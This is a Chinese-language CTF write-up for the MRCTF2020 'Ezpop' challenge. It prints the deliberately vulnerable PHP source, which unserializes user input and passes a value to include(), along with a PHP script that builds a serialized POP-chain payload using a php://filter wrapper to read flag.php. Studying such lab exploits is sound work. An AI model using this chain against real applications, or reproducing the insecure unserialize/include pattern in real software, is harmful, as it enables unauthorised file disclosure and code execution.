# 原创
：  [MRCTF2020]Ezpop

# [MRCTF2020]Ezpop

#### [MRCTF2020]Ezpop

## 考点

> 
反序列化、构造 POP 链


## 思路

> 
1、__wakeup() 方法通过 preg_match() 将 $this-&gt;source 做字符串比较，如果 $this-&gt;source 是 Show 类，就调用了__toString() 方法；<br/> 2、__toString() 访问了 str 的 source 属性，str 是 Test 类，不存在 source 属性，就调用了 Test 类的__get() 魔术方法；<br/> 4、__get() 方法将 p 作为函数使用，p 实例化为 Modify 类，就调用了 Modifier 的__invoke() 方法；<br/> 5、__invoke() 调用了 append() 方法，包含 $value，若将 $value 为伪协议，则可读 flag.php 源码


## Payload

> 
index.php源码


```
&lt;?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this-&gt;append($this-&gt;var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this-&gt;source = $file;
        echo 'Welcome to '.$this-&gt;source."&lt;br&gt;";
    }
    public function __toString(){
        return $this-&gt;str-&gt;source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this-&gt;source)) {
            echo "hacker";
            $this-&gt;source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this-&gt;p = array();
    }

    public function __get($key){
        $function = $this-&gt;p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}

```

> 
POP链：<br/> pop链的开始是Show类，使用反序列化去触发__wakeup魔术方法，__wakeup触发__toString，然后访问不存在的source属性，触发Test类里的__get方法，__get再以访问函数的形式访问一个类去触发Modifier类里的__invoke方法，此方法再调用append函数，完成flag.php的读取


```
&lt;?php
class Modifier{
	protected $var = "php://filter/read=convert.base64-encode/resource=flag.php";
}
class Show{
	public $source;
	public $str;
	public function __construct($file){
		$this-&gt;source = $file;
	}
}
class Test{
	public $p;
	public function __construct(){
		$this-&gt;p = new Modifier();
	}
}

$a = new Show('a');
$a-&gt;str = new Test();
$H3rmesk1t = new Show($a);
echo urlencode(serialize($H3rmesk1t))."\n";
?&gt;

```
